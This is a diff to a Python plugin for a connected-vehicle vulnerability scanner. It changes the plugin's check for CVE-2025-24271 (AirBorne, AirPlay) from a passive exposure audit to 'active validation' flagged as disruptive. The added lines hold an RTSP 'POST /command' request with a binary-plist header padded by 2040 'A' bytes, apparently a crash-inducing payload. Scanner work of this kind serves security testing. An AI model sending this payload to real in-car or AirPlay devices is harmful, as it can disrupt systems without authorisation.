@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Safe CVE exposure audit PoC for connected-vehicle vulnerability intelligence."""
+"""Active validation PoC for connected-vehicle vulnerability scanning."""
 from __future__ import annotations
 
 from active_validation_core import run_active_validation
@@ -135,23 +135,25 @@ VULN = {
         "commands",
         "without",
         "iOS and iPadOS"
-    ]
+    ],
+    "active_probe_paths": ["/server-info"],
+    "active_payload_text": "POST /command RTSP/1.0\r\nCSeq: 11\r\nContent-Type: application/x-apple-binary-plist\r\nContent-Length: 2048\r\n\r\n" + "bplist00" + "A" * 2040,
 }
 
 
 class Poc63CVE202524271AirBorneAuditPlugin(IVIVulnerabilityPlugin):
     meta_display_id = 'XLSX-087'
-    meta_poc_name = 'CVE-2025-24271 AirBorne系列漏洞 Exposure Audit'
+    meta_poc_name = 'CVE-2025-24271 AirBorne系列漏洞 Active Validation'
     meta_cve_id = 'CVE-2025-24271'
     meta_severity = 'High'
-    meta_protocol = 'carplay'
+    meta_protocol = 'airplay'
     meta_target_os = ['all']
     meta_required_params = ['software_inventory_text']
     meta_profiles = ['application']
     meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2025-24271'
     meta_attack_surface = '车机APP/应用'
-    is_disruptive = False
-    meta_destructive_level = "Safe"
+    is_disruptive = True
+    meta_destructive_level = "Disruptive"
 
     def check_prerequisites(self):
         return True
